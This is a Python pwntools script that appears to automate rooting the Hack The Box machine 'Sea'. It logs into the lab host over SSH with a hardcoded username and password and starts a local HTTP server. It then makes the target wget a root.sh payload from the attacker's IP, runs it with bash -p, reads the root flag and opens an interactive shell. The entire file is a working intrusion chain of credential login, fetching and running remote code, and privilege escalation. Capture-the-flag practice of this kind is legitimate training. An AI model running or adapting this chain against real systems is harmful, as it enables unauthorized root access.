import requests
import socket
from pwn import *
import threading
import os
import time
import subprocess

print("\n[\033[1;32m+\033[1;37m] Sea- Ninhpn1337\n")
time.sleep(1)

def server():
    subprocess.run(["python3", "-m", "http.server", "8025"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

time.sleep(1)

def get_user_input():
    # IPVPN
    print("\n[\033[1;32m+\033[1;37m] Please input your HTB IP - tun0 and we will get root :)")
    ip_address = input("\n[\033[1;32m+\033[1;37m] HTB IP: ")
    
    return ip_address




threading.Thread(target=server, args=()).start()


ip_address = get_user_input()


request = ssh(host="10.10.11.28", user="amay", password="mychemicalromance")
shell = request.process("/bin/sh")
shell.sendline(b"whoami")
time.sleep(0.5)
command = f"wget {ip_address}:8025/root.sh"  
shell.sendline(command.encode())
time.sleep(0.5)
shell.sendline(b"chmod +x root.sh")
time.sleep(0.5)
shell.sendline(b" bash -p root.sh")
time.sleep(1)
shell.sendline(b"bash -p bash -i root.sh")
print("\n[\033[1;32m+\033[1;37m] Execution whoami")
shell.sendline(b"echo whoami") 
print("\n[\033[1;32m+\033[1;37m] Cat root.txt")
shell.sendline(b"echo ############## GET ROOT FLAG ###############")
time.sleep(1)
shell.sendline(b"cat root.txt")
time.sleep(1)
shell.sendline(b"echo ############## SHELL ###############")
shell.sendline(b"whoami")
shell.interactive()
